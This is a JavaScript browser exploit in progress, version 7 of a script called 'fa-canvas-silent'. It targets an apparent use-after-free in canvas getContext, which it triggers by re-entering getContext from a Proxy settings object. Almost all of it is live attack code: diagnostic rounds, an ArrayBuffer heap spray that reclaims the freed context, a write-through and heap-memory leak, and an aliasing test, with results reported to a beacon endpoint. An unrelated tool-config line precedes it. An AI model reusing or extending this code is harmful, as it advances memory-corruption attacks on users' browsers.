mise ~/.config/mise/config.toml tools: gh@2.102.0
// fa-canvas-silent — v7: silent single-task matrix on the main thread
//
// State of play:
//   - v6: no OffscreenCanvas in workers either → the bug is only reachable
//     via HTMLCanvasElement / bitmaprenderer on the MAIN thread.
//   - v5d D1: the bare stale READ died — but an XHR beacon sat inside the
//     free→read window (its send() allocates ~400-class WebCore objects).
//   - v5 fakeRound: already silent in that window — died anyway — BUT the
//     getter-side ops (save xN + marker inside the conversion) were never
//     validated (v5d died at D1 before D2-D5).
//
// So two live hypotheses for the stage-2 deaths:
//   (a) in-window allocations (XHR/anything 384-512) reclaim the ctx slot;
//   (b) small freed FastMalloc blocks do not stay mapped (granule decommit);
//   (c) the getter-side save/marker crash inside the dictionary conversion.
//
// v7 runs every round as ONE synchronous JS task (no other JS task, no XHR,
// no beacon can interleave between free and read), buffers all results, and
// flushes a single POST per round AFTER the risky ops. The round sequence:
//   D1 control (bare read)   → (a)+(b): survives only if the window was
//                              the killer; dies if decommit is real
//   D2-D5 (saves/marker)      → (c): names the getter step if it crashes
//   S1 (stage-2 shot)         → full spray + write-through + leak
//   W  (wrapper identity)     → R2-style protected round
//
// Beacon prefix: VCS-  (round results are POSTed as the round body)
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VCS-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/VCS-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT');

  var MARKER = 6.02214076e23;

  function hex32(n) {
    var s = '';
    for (var i = 3; i >= 0; i--) {
      var b = (n >>> (8 * i)) & 0xff;
      s += (b < 16 ? '0' : '') + b.toString(16);
    }
    return s;
  }
  function f2hex(v) {
    var buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = v;
    var u = new Uint32Array(buf);
    return hex32(u[1]) + hex32(u[0]);
  }

  // ── D rounds: everything in ONE synchronous task, buffered, flushed after ──
  function diagRound(i, nSaves, useMarker, next) {
    var log = [];
    function R(tag, body) { log.push(tag + (body ? '=' + body : '')); }
    R('D' + i + '-START', 'saves=' + nSaves + ' marker=' + useMarker);
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          R('D' + i + '-GETTER', String(prop));
          inner = canvas.getContext('2d');
          R('D' + i + '-INNER', 'ok=' + !!inner);
          if (inner) {
            var sv;
            for (sv = 0; sv < nSaves; sv++) inner.save();
            if (sv === nSaves) R('D' + i + '-SAVES-OK', String(nSaves));
            if (useMarker) {
              inner.lineWidth = MARKER;
              R('D' + i + '-MARKER-OK', '');
            }
          }
        }
        return undefined;
      }
    });
    var outer = null;
    try {
      outer = canvas.getContext('2d', settings);
      R('D' + i + '-OUTER', 'ok=' + !!outer + ' same=' + (inner === outer));
    } catch (e) {
      R('D' + i + '-OUTER-X', String(e && e.message || e).substring(0, 80));
    }
    if (inner) {
      try { R('D' + i + '-RD', 'lw=' + inner.lineWidth); }
      catch (e) { R('D' + i + '-RD-X', String(e).substring(0, 60)); }
    }
    if (outer) {
      try { outer.fillRect(0, 0, 2, 2); R('D' + i + '-OUTER-FILL-OK', ''); }
      catch (e) { R('D' + i + '-OUTER-FILL-X', ''); }
    }
    R('D' + i + '-SURVIVED', '');
    BP('D' + i, log.join(' | '));
    setTimeout(next, 300);
  }

  // ── S1: stage-2 shot, same silent discipline ────────────────────────────
  function sprayRound(i, next) {
    var log = [];
    function R(tag, body) { log.push(tag + (body ? '=' + body : '')); }
    R('S' + i + '-START', '');
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          inner = canvas.getContext('2d');
          for (var sv = 0; sv < 8; sv++) inner.save();
          inner.lineWidth = MARKER;
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    var PER = 25, abs = [], views = [];
    for (var s = 1792; s <= 4352; s += 128) {
      for (var c = 0; c < PER; c++) {
        var ab = new ArrayBuffer(s);
        abs.push(ab);
        views.push(new Float64Array(ab));
      }
    }
    var rd;
    try { rd = inner ? inner.lineWidth : 'noinner'; }
    catch (e) { rd = 'X'; }
    if (rd === MARKER) {
      R('S' + i + '-MISS', 'rd=marker');
    } else if (rd === 0) {
      try { inner.lineWidth = 1.717; } catch (e) { R('S' + i + '-WT-X', ''); }
      var hitIdx = -1, hitOff = -1;
      outer2:
      for (var j = 0; j < views.length; j++) {
        for (var o = 0; o < views[j].length; o++) {
          if (views[j][o] === 1.717) { hitIdx = j; hitOff = o * 8; break outer2; }
        }
      }
      R('S' + i + '-HIT', 'ab=' + hitIdx + ' size=' +
        (hitIdx >= 0 ? abs[hitIdx].byteLength : -1) + ' off=' + hitOff);
      if (hitIdx >= 0) {
        try { inner.setLineDash([1.5, 2.5, 3.5, 4.5]); } catch (e) { R('S' + i + '-LD-X', ''); }
        var u8 = new Uint32Array(abs[hitIdx]);
        var out = [], found = 0;
        for (var q = 0; q + 1 < u8.length && found < 16; q += 2) {
          if (u8[q] === 0 && u8[q + 1] === 0) continue;
          if (q * 4 === hitOff) continue;
          out.push((q * 4) + ':' + hex32(u8[q + 1]) + hex32(u8[q]));
          found++;
        }
        for (var f = 0; f < out.length; f++) R('S' + i + '-LEAK' + f, out[f]);
      }
    } else {
      R('S' + i + '-RD', 'rd=' + f2hex(rd));
    }
    R('S' + i + '-SURVIVED', '');
    BP('S' + i, log.join(' | '));
    setTimeout(next, 300);
  }

  // ── W: wrapper identity (R2-protected) ──────────────────────────────────
  function wrapRound(next) {
    var N = 200;
    var sprayCanvases = [];
    for (var p = 0; p < N; p++) {
      var c = document.createElement('canvas');
      c.width = 8; c.height = 8;
      sprayCanvases.push(c);
    }
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          inner = canvas.getContext('2d');
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    var sprayCtxs = [];
    for (var s = 0; s < N; s++) sprayCtxs.push(sprayCanvases[s].getContext('2d'));
    var log = [];
    try {
      var ic = inner.canvas;
      var idResult = 'other', aliasIdx = -1;
      if (ic === canvas) idResult = 'original';
      else {
        for (var k = 0; k < N; k++)
          if (ic === sprayCanvases[k]) { aliasIdx = k; idResult = 'spray' + k; break; }
      }
      log.push('ident=' + idResult);
      if (aliasIdx >= 0) log.push('wrapperSame=' + (inner === sprayCtxs[aliasIdx]));
    } catch (e) { log.push('ident=throw:' + String(e).substring(0, 40)); }
    BP('W', log.join(' '));
    setTimeout(next, 300);
  }

  var plan = [];
  plan.push(function(next) { diagRound(1, 0, false, next); });
  plan.push(function(next) { diagRound(2, 1, false, next); });
  plan.push(function(next) { diagRound(3, 1, true, next); });
  plan.push(function(next) { diagRound(4, 8, false, next); });
  plan.push(function(next) { diagRound(5, 8, true, next); });
  plan.push(function(next) { sprayRound(1, next); });
  plan.push(function(next) { wrapRound(next); });

  B('PLAN', 'steps=' + plan.length);
  function run() {
    var step = plan.shift();
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    step(run);
  }
  setTimeout(run, 200);
})();
